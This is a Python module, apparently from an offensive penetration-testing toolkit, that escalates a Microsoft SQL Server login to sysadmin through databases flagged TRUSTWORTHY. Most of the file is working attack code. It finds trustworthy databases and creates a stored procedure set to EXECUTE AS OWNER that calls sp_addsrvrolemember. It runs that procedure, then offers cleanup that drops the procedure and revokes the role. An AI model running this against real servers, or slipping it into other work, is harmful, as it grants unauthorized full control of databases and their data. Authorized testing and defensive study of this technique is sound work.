#!/usr/bin/python
# -*- coding: utf-8 -*-

import logging
from Mssql import Mssql
from Utils import cleanString, ErrorClass, checkOptionsGivenByTheUser, ErrorClass
from Constants import *

class TrustworthyPE (Mssql):
	'''
	Privilege escalation through trustworthy database
	See: https://blog.netspi.com/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases/ 
	'''
	#CONSTANTS
	REQ_IS_SYSADMIN = "SELECT is_srvrolemember('sysadmin') as issysadmin"
	REQ_GET_TRUSTWORTY_DBS = "SELECT a.name AS name FROM master..sysdatabases as a INNER JOIN sys.databases as b ON a.name=b.name  WHERE is_trustworthy_on = 1"
	REQ_GET_CURRENT_USER = "SELECT SYSTEM_USER AS username"
	#REQ_IS_DB_OWNER = "SELECT mp.name as database_user from sys.database_role_members drm JOIN sys.database_principals rp ON (drm.role_principal_id = rp.principal_id) JOIN sys.database_principals mp ON (drm.member_principal_id = mp.principal_id) WHERE rp.name='db_owner' and mp.name='{0}'" #{0} Username
	#REQ_GET_ALL_DBS = "SELECT name FROM master..sysdatabases"
	REQ_STORED_PROC_TO_SYSADMIN = "CREATE PROCEDURE {0} WITH EXECUTE AS OWNER AS EXEC sp_addsrvrolemember '{1}','sysadmin'" #{0} stored proc name, {1} username
	REQ_DROP_PRIV = "EXEC sp_dropsrvrolemember '{0}','sysadmin'" #{0} username
	ERROR_PERM_DENIED = "permission denied in database"
	ERROR_SP_EXIST = "There is already an object named"
	ERROR_NO_PERMISSION = "because it does not exist or you do not have permission"
	
	def __init__(self, args):
		'''
		Constructor
		'''
		Mssql.__init__(self, args=args)
		self.args = args
		self.spName = "IMDATELOHJOSUUSOOJAHMSAT"
				
	def __getTrustworthyDBs__(self):
		'''
		Returns list of Databases flagged as Trustworthy
		If error, returns Exception
		'''
		databases = []
		logging.info("Getting databases flagged as Trustworthy")
		data = self.executeRequest(self.REQ_GET_TRUSTWORTY_DBS,ld=['name'])
		if isinstance(data,Exception): 
			return data
		else:
			for e in data: databases.append(e['name'])
			logging.debug("Databases flagged as Trustworthy: {0}".format(databases))
			return databases
	
	"""
	def __isDatabaseOwner__(self, username):
		'''
		Returns True if username is a database owner
		Otherwise returns False
		If error, returns Exception
		
		'''
		logging.info("Checking if '{0}' is a database owner".format(username))
		data = self.executeRequest(self.REQ_IS_DB_OWNER.format(username), ld=['username'])
		print "-----------6>",data
		if isinstance(data,Exception):
			return data
		else:
			for e in data:
				logging.debug("The current user named {0} is a database owner".format(username)) 
				return True
			return False
	"""
	
	def __createStoredProcToPE__(self, spName, username):
		'''
		Create a stored procedure (named spName)to give the sysadmin priv to username
		Returns True if OK
		Returns Exception if error
		'''
		logging.info("Creating the {0} stored procedure to give the sysadmin priv to {1}".format(spName, username))
		data = self.executeRequest(self.REQ_STORED_PROC_TO_SYSADMIN.format(spName, username), noResult=True)
		if isinstance(data,Exception):  
			return data
		else:
			logging.debug("The stored procedure named {0} has been created".format(spName)) 
			return True	
		
	def __dropSysadminPriv__(self, username):
		'''
		Drop the sysadmin priv of username
		Returns True
		Returns Exception if error
		'''
		logging.info("Revoking the sysadmin priv of {0}".format(username))
		data = self.executeRequest(self.REQ_DROP_PRIV.format(username), noResult=True)
		if isinstance(data,Exception):  return data
		else:
			logging.debug("The sysadmin priv of {0} has been removed".format(username))
			return True
			
	def tryPE (self):
		'''
		Try to elevate privs to become sysadmin
		Returns True if PE has success
		Otherwise returns Exception
		'''
		logging.info("Trying to become sysadmin thanks to trustworthy database method")
		isSysadmin = self.isCurrentUserSysadmin()
		if isinstance(isSysadmin,Exception): return isSysadmin
		if isSysadmin == True:
			msg = "The current user is already sysadmin, nothing to do"
			logging.info(msg)
			return ErrorClass(msg)
		else :
			currentUsername = self.getCurrentUser()
			if isinstance(currentUsername, Exception): return currentUsername
			trustworthyDBs = self.__getTrustworthyDBs__()
			if isinstance(trustworthyDBs, Exception): return trustworthyDBs
			if trustworthyDBs == []:
				msg = "No one database is flagged as trustworthy, this method can't success"
				logging.info(msg)
				return ErrorClass(msg)
			else:
				logging.info("One database is flagged as trustworthy at least, continue...")
			for aDB in trustworthyDBs:
				logging.info("Moving to the database {0}".format(aDB))
				status = self.useThisDB(aDB)
				if isinstance(status, Exception): 
					logging.info("Impossible to move to the database {0}, try another database".format(aDB))
				else:
					#isDatabaseOwner = self.__isDatabaseOwner__(currentUsername)
					#if isDatabaseOwner == False:
					#	logging.info("The current user is not a database owner, this method can't success")
					#	return False
					#else:
					#	logging.info("The current user is a database owner, continue...")
					status = self.__createStoredProcToPE__(self.spName, currentUsername)
					if isinstance(status,Exception): 
						if self.ERROR_PERM_DENIED in str(status): 
							logging.info("The current user can't create a stored procedure in this database, try another database")
						elif self.ERROR_SP_EXIST in str(status):
							logging.info("The stored procedure {0} exists in the database, you must to remove it from this database!".format(self.spName))
						else:
							logging.warning("This following error is not catched but the program continues: {0}".format(status))
					elif status == True:
						logging.info("The stored procedure for PE is created, continue...")
						status = self.execSP(self.spName)
						if isinstance(status,Exception): return status
						elif status == True:
							logging.info("The stored has been executed successfully. You are now sysadmin!")
							return True	
				logging.info("We have tried all trustworthy DBs. The current user can't create a stored procedure in it")
				return 	status		
			
	def cleanPE(self):
		'''
		Try to clean privi escalation (PE)
		Returns True if cleaned
		Returns False if impossible
		Otherwise returns Exception
		'''
		logging.info("Cleaning the lastest privilege escalation")
		currentUsername = self.getCurrentUser()
		if isinstance(currentUsername, Exception): return currentUsername
		logging.info("Getting trustworthy DBs because the stored procedure to detele is stored in one of them")
		trustworthyDBs = self.__getTrustworthyDBs__()
		if isinstance(trustworthyDBs, Exception): return trustworthyDBs
		if trustworthyDBs == []:
			msg = "No one database is flagged as trustworthy, no one stored procedure to delete"
			logging.info(msg)
			return ErrorClass(msg)
		else:
			logging.info("One database is flagged as trustworthy at least, seaching the stored procedure in these databases")
		for aDB in trustworthyDBs:
			status = self.useThisDB(aDB)
			if isinstance(status, Exception): 
				logging.info("Impossible to move to the database {0}, try another database".format(aDB))
			else:
				status = self.deleteSP(self.spName)
				if isinstance(status,Exception):
					logging.info("Impossible to delete this stored procedure in {0}: {1}".format(aDB, status))
		status = self.__dropSysadminPriv__(currentUsername)
		if isinstance(status,Exception): return status
		logging.info("Latest privilege escalation cleaned")
		return True
		

	def testAll (self):
		'''
		Test all functions
		'''
		self.args['print'].subtitle("Can the current user become sysadmin with trustworthy database method ?")
		status = self.tryPE()
		if isinstance(status,Exception) or status == False:
			self.args['print'].badNews("KO")
		else :
			self.args['print'].goodNews("OK")
		self.cleanPE()

def runTrustworthyPEModule(args):
	'''
	Run the TrustworthyPE module
	'''
	if checkOptionsGivenByTheUser(args,["test-module", "be-sysadmin", "drop-sysadmin","is-sysadmin"],checkAccount=True) == False : return EXIT_MISS_ARGUMENT
	trustworthyPE = TrustworthyPE(args)
	trustworthyPE.connect()
	if args["sp-name"] != "": trustworthyPE.spName = args["sp-name"]
	if args["test-module"] == True: trustworthyPE.testAll()
	if args["be-sysadmin"] == True: 
		args['print'].title("Try to become sysadmin with the trustworthy database method")
		status = trustworthyPE.tryPE()
		if status == True:
			args['print'].goodNews("The current user is now sysadmin ! You should run again the all module to know what you can do...")
		else :
			args['print'].badNews("Impossible to put the sysadmin privilege to the current user with this method: {0}".format(status))	
	if args["drop-sysadmin"] == True:
		args['print'].title("Try to drop sysadmin privilege to the current user")
		continu = raw_input("Do you want really drop sysadmin privilege of the current user (y/N) ").lower() == 'y'
		if continu == True:
			status = trustworthyPE.cleanPE()
			if status == True:
				args['print'].goodNews("Sysadmin privilege dropped for the current user")
			else :
				args['print'].badNews("Impossible to drop the sysadmin privilege for the current user: {0}".format(status))
		else:
			args['print'].badNews("Sysadmin privilege has not been modified")	
	if args["is-sysadmin"] == True:
		args['print'].title("Is the current user is sysadmin?")
		isSysadmin = trustworthyPE.isCurrentUserSysadmin()
		if isinstance(isSysadmin,Exception):
			args['print'].badNews("Impossible to know if the current user is sysadmin: {0}".format(isSysadmin))
		if isSysadmin == True: args['print'].goodNews("The current user is sysadmin")
		else: args['print'].goodNews("The current user is NOT sysadmin")

